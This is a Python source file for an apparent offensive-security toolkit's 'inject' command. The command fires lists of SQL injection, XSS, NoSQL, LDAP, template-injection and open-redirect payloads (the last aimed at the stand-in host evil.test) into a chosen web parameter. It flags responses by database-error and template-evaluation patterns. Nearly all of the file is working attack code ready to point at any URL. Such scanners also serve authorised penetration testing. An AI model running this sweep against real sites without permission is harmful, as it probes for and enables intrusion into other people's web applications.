from __future__ import annotations

import base64
import http.client
import json
import re
import ssl
import urllib.parse
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

CLASSES = {
    "sqli": ["'", "\"", "')", "';", "1' OR '1'='1", "1 OR 1=1", "admin'--",
             "' OR 1=1--", "' UNION SELECT NULL,NULL--", "\" OR \"\"=\""],
    "xss": ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>", "javascript:alert(1)",
            "'-alert(1)-'", "<svg/onload=confirm(1)>"],
    "nosqli": ["{\"$ne\":null}", "{\"$gt\":\"\"}", "'; return true; var x='"],
    "ldapi": ["*)(uid=*))(|(uid=*", "admin*", "*)(objectClass=*"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}"],
    "openredir": ["//evil.test", "https://evil.test", "/\\evil.test", "///evil.test"],
}

SIGNALS = {
    "sqli": [r"you have an error in your sql", r"sql syntax", r"warning.*mysql",
             r"unclosed quotation mark", r"pg_query\(\)", r"sqlite3\.", r"ora-\d+"],
    "xss": [],
    "nosqli": [r"mongoerror", r"mongo.*exception", r"bad value"],
    "ldapi": [r"ldap.*error", r"invalid dn syntax", r"protocol error"],
    "ssti": [r"(?<![\d])49(?![\d])", r"config\b", r"SECRET_KEY"],
    "openredir": [],
}

@tool("inject", "Web parameter injection sweep across multiple classes", category="web")
class Inject:
    @staticmethod
    def build_parser(p):
        p.add_argument("url")
        p.add_argument("--param", required=True)
        p.add_argument("--method", default="GET", choices=["GET", "POST", "JSON"])
        p.add_argument("--classes", default="all",
                       help="comma list of classes: sqli,xss,nosqli,ldapi,ssti,openredir or 'all'")
        p.add_argument("--timeout", type=float, default=8.0)
        p.add_argument("--insecure", action="store_true")
        p.add_argument("--cookie", help="Cookie header")
        p.add_argument("--follow", action="store_true", help="follow up to 3 redirects for openredir")
        p.add_argument("-o", "--out")

    @staticmethod
    def _ctx(insecure):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _send(url, method, param, payload, timeout, ctx, cookie):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        headers = {"User-Agent": "fsociety-inject/1.0"}
        if cookie:
            headers["Cookie"] = cookie

        if method == "GET":
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            target = (parsed.path or "/") + "?" + urllib.parse.urlencode(qs, doseq=True)
            conn_cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
            conn = conn_cls(host, port, timeout=timeout, context=ctx) if scheme == "https" \
                   else conn_cls(host, port, timeout=timeout)
            conn.request("GET", target, headers=headers)
        elif method == "POST":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            body = urllib.parse.urlencode({param: payload})
            target = parsed.path or "/"
            if parsed.query:
                target += "?" + parsed.query
            conn_cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
            conn = conn_cls(host, port, timeout=timeout, context=ctx) if scheme == "https" \
                   else conn_cls(host, port, timeout=timeout)
            conn.request("POST", target, body=body, headers=headers)
        else:
            headers["Content-Type"] = "application/json"
            body = json.dumps({param: payload})
            target = parsed.path or "/"
            conn_cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
            conn = conn_cls(host, port, timeout=timeout, context=ctx) if scheme == "https" \
                   else conn_cls(host, port, timeout=timeout)
            conn.request("POST", target, body=body, headers=headers)

        try:
            resp = conn.getresponse()
            return resp.status, dict(resp.getheaders()), resp.read(16384)
        finally:
            conn.close()

    @staticmethod
    def _interesting(kind, text, payload, headers):
        for pattern in SIGNALS.get(kind, []):
            if re.search(pattern, text, re.I):
                return True
        if kind == "xss" and payload in text:
            return True
        if kind == "openredir":
            loc = headers.get("Location", "") or headers.get("location", "")
            if payload.strip("/") in loc and ("evil" in loc):
                return True
        return False

    @staticmethod
    def run(args, log: Log) -> int:
        wanted = list(CLASSES) if args.classes == "all" else [c.strip() for c in args.classes.split(",") if c.strip()]
        ctx = Inject._ctx(args.insecure)
        hits = []
        for kind in wanted:
            for payload in CLASSES.get(kind, []):
                try:
                    status, headers, data = Inject._send(args.url, args.method, args.param,
                                                         payload, args.timeout, ctx, args.cookie)
                except (OSError, ssl.SSLError, http.client.HTTPException) as exc:
                    log.warn(f"{kind}: {exc}")
                    continue
                text = data.decode("utf-8", "ignore")
                if Inject._interesting(kind, text, payload, headers):
                    hits.append({"class": kind, "payload": payload,
                                 "status": status, "length": len(data)})
                    log.hit(f"{kind} -> {payload!r}")
        if args.out and hits:
            Path(args.out).write_text(json.dumps(hits, indent=2))
            log.ok(f"{len(hits)} hit(s) -> {args.out}")
        log.ok(f"{len(hits)} hit(s)")
        return 0 if hits else 1
